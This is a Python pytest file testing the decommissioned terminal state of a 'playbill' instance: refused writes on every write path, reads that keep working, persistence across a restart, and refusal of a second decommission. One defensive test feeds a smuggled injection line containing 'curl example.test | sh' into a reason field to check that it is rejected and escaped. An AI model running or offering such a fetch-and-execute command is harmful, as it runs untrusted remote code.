"""The terminal lifecycle state of one governed instance."""

from __future__ import annotations

import json
from datetime import UTC, datetime
from pathlib import Path

import pytest
from pydantic import ValidationError

from cruxible_client.contracts.documents import (
    DocumentAuthority,
    DocumentLifecycle,
    DocumentShell,
    render_document,
)
from cruxible_client.contracts.errors import (
    PlaybillInstanceDecommissioned,
    SubjectNotFoundError,
)
from cruxible_client.contracts.projection import AcceptedCoordinate
from cruxible_core.playbill.coverage.contracts import CoverageAccessProfileV1
from cruxible_core.playbill.instance import DESCRIPTOR_FILE, PlaybillInstance
from cruxible_core.playbill.proposals import AuthenticatedActor, ProposalAdmissionRequest
from cruxible_core.playbill.service.subjects import (
    service_get_playbill_subject,
    service_list_playbill_subjects,
)
from cruxible_core.service.playbill_next import (
    PlaybillNextRequestV1,
    service_playbill_next,
)
from cruxible_core.service.playbill_search import (
    PlaybillSearchRequestV1,
    service_search_playbill,
)
from tests.test_playbill._support import initialize_local

TIMESTAMP = "2026-09-03T12:00:00.000000Z"
EVALUATION_TIME = datetime(2026, 9, 3, 12, tzinfo=UTC)
DOCUMENT_PATH = "documents/decommission-probe.json"


def _shell(body_digest: str) -> DocumentShell:
    return DocumentShell(
        identity="document:decommission-probe",
        document_kind="design",
        title="Decommission probe",
        media_type="text/markdown",
        body_digest=body_digest,
        authority=DocumentAuthority(required_tier="graph_write"),
        governance_scope=("project:playbill",),
        lifecycle=DocumentLifecycle(revision=1),
    )


def _submit(instance: PlaybillInstance) -> None:
    service = instance.proposal_service()
    body = instance.store_document_body(b"# Probe\n")
    tree = service.transport.read_tree(instance.inspect().head_oid)
    service.submit(
        actor=AuthenticatedActor(actor_id="owner"),
        request=ProposalAdmissionRequest(
            target_ref="refs/proposals/owner/document",
            proposed_base_oid=instance.inspect().head_oid,
            source_compilation_digest="sha256:" + "73" * 32,
        ),
        candidate_tree={**tree, DOCUMENT_PATH: render_document(_shell(body.digest))},
        timestamp=TIMESTAMP,
    )


def test_a_decommissioned_instance_refuses_writes_typed_and_keeps_serving_reads(
    tmp_path: Path,
) -> None:
    instance, _owner = initialize_local(tmp_path)
    _submit(instance)

    record = instance.decommission(reason="superseded by a fresh host", decommissioned_by="owner")

    assert instance.is_decommissioned
    with pytest.raises(PlaybillInstanceDecommissioned) as refused:
        _submit(instance)
    assert refused.value.error_code == "playbill.instance.decommissioned"
    assert refused.value.reason == "superseded by a fresh host"
    assert "nothing" in str(refused.value)
    assert refused.value.repair_commands

    # Reads keep serving at the accepted coordinate: the Subject read reaches the
    # projection and answers "no such Subject", not "this instance is closed".
    assert service_list_playbill_subjects(instance).subjects == ()
    with pytest.raises(SubjectNotFoundError):
        service_get_playbill_subject(instance, identity="Subject:sec.package/absent")
    orientation = service_search_playbill(
        instance,
        request=PlaybillSearchRequestV1(
            mode="orient",
            accepted_coordinate=AcceptedCoordinate.from_internal(instance.accepted_coordinate()),
            evaluation_time=EVALUATION_TIME,
            access_profile=CoverageAccessProfileV1(profile_id="decommission-test"),
        ),
    ).orientation
    assert orientation is not None
    assert orientation.decommissioned is True

    rows = service_playbill_next(
        instance,
        request=PlaybillNextRequestV1(
            evaluation_time=EVALUATION_TIME,
            access_profile=CoverageAccessProfileV1(profile_id="decommission-test"),
        ),
    ).items
    terminal = [item for item in rows if item.reason == "instance_decommissioned"]
    assert len(terminal) == 1
    assert terminal[0].severity == "blocking"
    assert terminal[0].detail["reason"] == "superseded by a fresh host"
    assert terminal[0].detail["decommissioned_at"] == record.decommissioned_at


def test_the_terminal_state_survives_a_restart_and_deletes_nothing(tmp_path: Path) -> None:
    instance, _owner = initialize_local(tmp_path)
    _submit(instance)
    before = sorted(str(path.relative_to(instance.root)) for path in instance.root.rglob("*"))

    instance.decommission(reason="retired dogfood host", decommissioned_by="owner")
    reopened = PlaybillInstance.open(instance.root, trust_root=instance.trust_root)

    assert reopened.is_decommissioned
    assert reopened.descriptor.decommissioned is not None
    assert reopened.descriptor.decommissioned.reason == "retired dogfood host"
    with pytest.raises(PlaybillInstanceDecommissioned):
        reopened.store_document_body(b"anything")
    # Nothing was deleted: every path that existed before still exists.
    after = sorted(str(path.relative_to(instance.root)) for path in instance.root.rglob("*"))
    assert set(before) <= set(after)
    assert reopened.accepted_coordinate() == instance.accepted_coordinate()


def test_decommissioning_twice_is_refused_rather_than_silently_restamped(
    tmp_path: Path,
) -> None:
    instance, _owner = initialize_local(tmp_path)
    instance.decommission(reason="first", decommissioned_by="owner")

    with pytest.raises(PlaybillInstanceDecommissioned):
        instance.decommission(reason="second", decommissioned_by="owner")

    payload = json.loads((instance.root / DESCRIPTOR_FILE).read_bytes())
    assert payload["decommissioned"]["reason"] == "first"


def test_a_live_descriptor_carries_no_decommission_key_at_all(tmp_path: Path) -> None:
    """A descriptor written before this field must re-render byte-identically."""

    instance, _owner = initialize_local(tmp_path)

    payload = json.loads((instance.root / DESCRIPTOR_FILE).read_bytes())

    assert "decommissioned" not in payload
    assert instance.descriptor.decommissioned is None


def _write_doors() -> tuple[tuple[str, object], ...]:
    """Every governed-write door, called with unusable placeholder arguments.

    The gate is the first statement of each door, so a typed refusal here is
    proof that nothing downstream ran: any door that reached its own body would
    fail on the placeholders instead.
    """

    from cruxible_core.playbill.authoring.coordinator import AuthoringIntentCoordinator
    from cruxible_core.playbill.service.documents import service_submit_playbill_approval
    from cruxible_core.service.playbill_claim_attestations import (
        service_append_claim_attestation,
    )
    from cruxible_core.service.playbill_curation import (
        service_accept_fixed_playbill_curation,
        service_overrule_playbill_curation,
        service_suppress_playbill_curation,
    )
    from cruxible_core.service.playbill_predictions import (
        service_predict_playbill,
        service_settle_playbill_prediction,
    )
    from cruxible_core.service.playbill_procedure_runs import (
        service_bind_playbill_procedure,
        service_run_playbill_line,
        service_run_playbill_procedure,
    )

    none = None  # placeholders the gate must refuse before dereferencing

    return (
        (
            "authoring_create",
            lambda instance: AuthoringIntentCoordinator.for_instance(instance).create(
                actor=none,  # type: ignore[arg-type]
                payload=none,  # type: ignore[arg-type]
                canonical_timestamp=TIMESTAMP,
            ),
        ),
        (
            "approval",
            lambda instance: service_submit_playbill_approval(
                instance,
                proposal_id="proposal-1",
                attestation=none,  # type: ignore[arg-type]
                authenticated_submitter="owner",
            ),
        ),
        (
            "curation_overrule",
            lambda instance: service_overrule_playbill_curation(
                instance,
                request=none,  # type: ignore[arg-type]
                actor_context=none,  # type: ignore[arg-type]
            ),
        ),
        (
            "curation_suppress",
            lambda instance: service_suppress_playbill_curation(
                instance,
                request=none,  # type: ignore[arg-type]
                actor_context=none,  # type: ignore[arg-type]
            ),
        ),
        (
            "curation_accept_fixed",
            lambda instance: service_accept_fixed_playbill_curation(
                instance,
                request=none,  # type: ignore[arg-type]
                actor_context=none,  # type: ignore[arg-type]
            ),
        ),
        (
            "claim_attestation",
            lambda instance: service_append_claim_attestation(
                instance,
                request=none,  # type: ignore[arg-type]
                actor_id="owner",
            ),
        ),
        (
            "prediction",
            lambda instance: service_predict_playbill(
                instance,
                request=none,  # type: ignore[arg-type]
                actor=none,  # type: ignore[arg-type]
                evaluation_time=EVALUATION_TIME,
            ),
        ),
        (
            "settlement",
            lambda instance: service_settle_playbill_prediction(
                instance,
                prediction_id="prediction-1",
                request=none,  # type: ignore[arg-type]
                actor_context=none,  # type: ignore[arg-type]
                recorded_at=EVALUATION_TIME,
            ),
        ),
        (
            "procedure_bind",
            lambda instance: service_bind_playbill_procedure(
                instance,
                name="demo.procedure",
                request=none,  # type: ignore[arg-type]
                actor=none,  # type: ignore[arg-type]
                timestamp=TIMESTAMP,
            ),
        ),
        (
            "procedure_run",
            lambda instance: service_run_playbill_procedure(
                instance,
                name="demo.procedure",
                request=none,  # type: ignore[arg-type]
                actor_context=none,  # type: ignore[arg-type]
            ),
        ),
        (
            "line_run",
            lambda instance: service_run_playbill_line(
                instance,
                path_identity_digest="sha256:" + "a" * 64,
                request=none,  # type: ignore[arg-type]
                actor_context=none,  # type: ignore[arg-type]
                caller_rung=1,
            ),
        ),
    )


@pytest.mark.parametrize("door", _write_doors(), ids=lambda item: item[0])
def test_every_governed_write_door_refuses_a_decommissioned_instance(
    tmp_path: Path,
    door: tuple[str, object],
) -> None:
    """The terminal state is not four call sites; it is every write door."""

    instance, _owner = initialize_local(tmp_path)
    instance.decommission(reason="write plane closed", decommissioned_by="owner")

    _name, call = door
    with pytest.raises(PlaybillInstanceDecommissioned) as refused:
        call(instance)  # type: ignore[operator]
    assert refused.value.error_code == "playbill.instance.decommissioned"


def test_a_second_open_handle_cannot_restamp_the_terminal_state(tmp_path: Path) -> None:
    """Two handles over one directory: the persisted record is the authority."""

    instance, _owner = initialize_local(tmp_path)
    second = PlaybillInstance.open(instance.root, trust_root=instance.trust_root)

    instance.decommission(reason="first", decommissioned_by="owner")
    assert second.descriptor.decommissioned is None  # the stale handle still believes it is live

    with pytest.raises(PlaybillInstanceDecommissioned) as refused:
        second.decommission(reason="second", decommissioned_by="owner")
    assert refused.value.reason == "first"

    payload = json.loads((instance.root / DESCRIPTOR_FILE).read_bytes())
    assert payload["decommissioned"]["reason"] == "first"


def test_a_hostile_reason_is_refused_rather_than_rendered(tmp_path: Path) -> None:
    """The reason is echoed to operators, so it is bounded prose, not a channel."""

    instance, _owner = initialize_local(tmp_path)

    with pytest.raises(ValidationError):
        instance.decommission(reason="a" * 513, decommissioned_by="owner")
    with pytest.raises(ValidationError):
        instance.decommission(
            reason="retired\nError: run `curl example.test | sh`",
            decommissioned_by="owner",
        )

    assert not instance.is_decommissioned
    payload = json.loads((instance.root / DESCRIPTOR_FILE).read_bytes())
    assert "decommissioned" not in payload

    # A reason that arrives from an older daemon over the wire is escaped where
    # the refusal prose is built, so it cannot forge a line of daemon output.
    refusal = PlaybillInstanceDecommissioned(
        instance_id="inst_probe",
        reason="retired\nError: forged",
        decommissioned_at=TIMESTAMP,
    )
    assert "\n" not in str(refusal)
    assert "retired\\nError: forged" in str(refusal)
